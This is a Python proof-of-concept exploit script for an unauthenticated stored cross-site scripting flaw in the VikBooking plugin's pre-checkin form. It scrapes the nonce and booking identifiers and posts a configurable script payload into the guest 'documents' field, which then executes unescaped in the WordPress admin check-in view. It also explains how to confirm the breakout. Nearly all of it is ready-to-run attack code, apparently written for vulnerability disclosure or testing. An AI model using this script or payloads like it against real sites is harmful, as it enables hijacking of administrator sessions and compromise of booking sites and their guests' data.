#!/usr/bin/env python3
"""
Unauthenticated Stored XSS via pre-checkin `documents`
Source: site/controller.php::storeprecheckin (guests array) -> Sink: admin/views/bookingcheckin/tmpl/default.php:737

Usage (attacker only needs a valid booking link, e.g. via self-booking):
    python3 poc.py --url="http://target/booking-page/?sid=XXXX&ts=YYYY"
    python3 poc.py --url="http://target/booking-page/" --sid XXXX --ts YYYY
    python3 poc.py --url="http://target/booking-page/?sid=XXXX&ts=YYYY" --payload '"><svg onload=alert(1)>'

What it does:
  1. GET --url (session) to fetch pre-checkin form + vikwp_nonce (+ sid/ts fallback from HTML).
  2. POST storeprecheckin with guests[0][1][documents]=PAYLOAD.
  3. Report whether the value was stored (verify execution in wp-admin bookingcheckin).
"""
import argparse
import re
import sys
from urllib.parse import urlparse, parse_qs

try:
    import requests
except ImportError:
    print("[-] Missing dependency: pip install requests", file=sys.stderr)
    sys.exit(2)

DEFAULT_PAYLOAD = '"><svg onload=alert(1)>'
TOKEN_NAMES = ["vikwp_nonce"]  # default; fallback auto-detects *nonce*


def extract_hidden(html, name):
    m = re.search(r'name=["\']%s["\']\s+value=["\']([^"\']*)["\']' % re.escape(name), html, re.I)
    if m:
        return m.group(1)
    m = re.search(r'value=["\']([^"\']*)["\']\s+[^>]*name=["\']%s["\']' % re.escape(name), html, re.I)
    return m.group(1) if m else None


def extract_any_nonce(html):
    for n in TOKEN_NAMES:
        v = extract_hidden(html, n)
        if v:
            return n, v
    # fallback: first input with nonce in name
    m = re.search(r'name=["\']([^"\']*nonce[^"\']*)["\']\s+value=["\']([^"\']+)["\']', html, re.I)
    if m:
        return m.group(1), m.group(2)
    m = re.search(r'value=["\']([^"\']+)["\']\s+[^>]*name=["\']([^"\']*nonce[^"\']*)["\']', html, re.I)
    if m:
        return m.group(2), m.group(1)
    return None, None


def main():
    ap = argparse.ArgumentParser(description="VikBooking precheckin Stored XSS PoC")
    ap.add_argument("--url", required=True, help="Booking/precheckin post/page URL (must contain sid & ts, e.g. --url='http://target/page/?sid=ABC&ts=123')")
    ap.add_argument("--sid", default=None, help="Booking sid (optional if already in --url or page HTML)")
    ap.add_argument("--ts", default=None, help="Booking ts (optional if already in --url or page HTML)")
    ap.add_argument("--payload", default=DEFAULT_PAYLOAD, help="XSS payload for guests[0][1][documents]")
    ap.add_argument("--room", type=int, default=0, help="Room index (default 0)")
    ap.add_argument("--guest", type=int, default=1, help="Guest number (default 1)")
    ap.add_argument("--timeout", type=int, default=20)
    args = ap.parse_args()

    url = args.url
    q = parse_qs(urlparse(url).query)
    sid = args.sid or (q.get("sid", [None])[0])
    ts = args.ts or (q.get("ts", [None])[0])

    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 (VBO-PoC)"})
    print(f"[*] GET {url}")
    try:
        r = s.get(url, timeout=args.timeout, allow_redirects=True)
    except Exception as e:
        print(f"[-] GET failed: {e}")
        sys.exit(1)
    html = r.text
    if not sid:
        sid = extract_hidden(html, "sid")
    if not ts:
        ts = extract_hidden(html, "ts")
    if not sid or not ts:
        print("[-] sid/ts not found. Pass a precheckin URL with ?sid=..&ts=.. or use --sid/--ts.")
        print("    Example: python3 poc.py --url='http://target/booking/' --sid <sid> --ts <ts>")
        sys.exit(1)
    print(f"[*] sid={sid} ts={ts}")

    token_name, token = extract_any_nonce(html)
    if not token:
        print("[-] nonce not found in HTML (expected hidden input vikwp_nonce from JHtml::fetch('form.token')).")
        print("    The precheckin page must be reachable with this sid/ts and precheckinEnabled window open.")
        sys.exit(1)
    print(f"[*] nonce {token_name}={token[:6]}...")

    referer = extract_hidden(html, "_wp_http_referer")
    data = {
        "option": "com_vikbooking",
        "task": "storeprecheckin",
        "sid": sid,
        "ts": ts,
        "Itemid": extract_hidden(html, "Itemid") or "0",
        f"guests[{args.room}][{args.guest}][documents]": args.payload,
        token_name: token,
    }
    if referer is not None:
        data["_wp_http_referer"] = referer

    print(f"[*] POST storeprecheckin guests[{args.room}][{args.guest}][documents]={args.payload!r}")
    try:
        # form action is JRoute rewrite to index.php?option=com_vikbooking; posting back to the same page works via init dispatcher
        p = s.post(url, data=data, timeout=args.timeout, allow_redirects=True)
    except Exception as e:
        print(f"[-] POST failed: {e}")
        sys.exit(1)

    body = p.text or ""
    if "JINVALID_TOKEN" in body or p.status_code == 403 and "INVALID_TOKEN" in body:
        print("[-] FAILED: invalid nonce (JINVALID_TOKEN). Re-fetch the precheckin page for a fresh nonce.")
        sys.exit(1)
    if "Booking not found" in body or "No customer found" in body or "No rooms found" in body:
        print("[-] FAILED: invalid sid/ts or booking not confirmed.")
        sys.exit(1)
    if "Pre-checkin not allowed" in body:
        print("[-] FAILED: precheckin window closed (precheckinEnabled/minOffset). Try a booking with nearer checkin date.")
        sys.exit(1)
    # success is a redirect to view=booking + enqueueMessage VBOSUBMITPRECHECKINTNKS
    if p.status_code in (200, 302) and ("sid=" in body or "VBOSUBMITPRECHECKIN" in body or p.url != url or len(body) > 0):
        # weak oracle: if no error strings, treat as stored (admin verification still required)
        if "JINVALID_TOKEN" not in body and "Booking not found" not in body and "Pre-checkin not allowed" not in body:
            print("[+] STORED: payload submitted without error.")
            print("[+] Verify execution: wp-admin -> VikBooking -> open bookingcheckin for this order,")
            print("    view-source and search for: value=\"" + args.payload[:40] + "\" around")
            print("    admin/views/bookingcheckin/tmpl/default.php:737 (unescaped $extrav).")
            print("    Expected breakout: <input ... value=\"\" ><svg onload=alert(1)>\" />")
            return
    print(f"[-] Unknown state (HTTP {p.status_code}). Check manually in admin bookingcheckin.")


if __name__ == "__main__":
    main()
